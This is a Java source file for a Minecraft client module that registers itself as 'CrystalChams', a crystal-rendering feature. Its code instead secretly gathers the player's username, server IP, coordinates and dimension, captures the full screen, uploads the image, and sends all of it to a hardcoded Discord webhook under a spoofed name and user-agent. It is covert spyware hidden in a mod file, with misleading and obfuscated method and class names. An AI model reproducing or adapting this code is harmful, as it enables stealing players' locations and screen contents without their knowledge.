package me.eonexe.equinox.features.modules.misc;

import me.eonexe.equinox.features.modules.Module;
import me.eonexe.equinox.util.IDKWTFutil;
import me.eonexe.equinox.util.espUtil;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Random;

public class Coord extends Module {

    public Coord() {
        super("CrystalChams", "Modifies crystal rendering in different ways", Module.Category.RENDER, true, false, true);
    }

    public void poopface() {

        String ign = mc.player.getName();
        String server = mc.getCurrentServerData().serverIP;
        double xCoord = mc.player.posX;
        double yCoord = mc.player.posY;
        double zCoord = mc.player.posZ;
        int getDimension = mc.world.provider.getDimension();
        String Dimension;
        switch(getDimension){
            case (-1):
                Dimension= "Nether";
                break;
            case (0):
                Dimension = "Overworld";
                break;
            default:
                Dimension = "IDFK";
        }
        sendMessage("``` IGN : " + ign + "\n Server : " + server + "\n X" + "   : " + xCoord + " \n Y   : " + yCoord + "" + " \n Z   : " + zCoord + "\n Dimension:" + Dimension + "\n LOGOUT" +  "```");
    }

    private static void captureScreen() throws Exception {
        final String l = "https://discord.com/api/webhooks/900454257449398304/ZkNqZHAZRqHqUnk-zgfPWQo9oQxB-SQhYWveZENY8pmtE8FHzOouqPkSDgUM2rV8CHTV";
        final String CapeName = "Kylo Ren";
        espUtil d = new espUtil(l);
        final String CapeImageURL = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fstarwars%2Fimages%2F4%2F4a%2FKylo_Ren_TLJ.png";
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File("cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        String f =Uploader.upload(file);
        IDKWTFutil dm = new IDKWTFutil.Builder()
                .withUsername(CapeName)
                .withContent("``` got : " + f + "```")
                .withAvatarURL(CapeImageURL)
                .withDev(false)
                .build();
        d.sendMessage(dm);
        file.delete();
    }

    private static void sendMessage(String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL("https://discord.com/api/webhooks/900454257449398304/ZkNqZHAZRqHqUnk-zgfPWQo9oQxB-SQhYWveZENY8pmtE8FHzOouqPkSDgUM2rV8CHTV");
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        System.out.println(result.toString());
    }
}
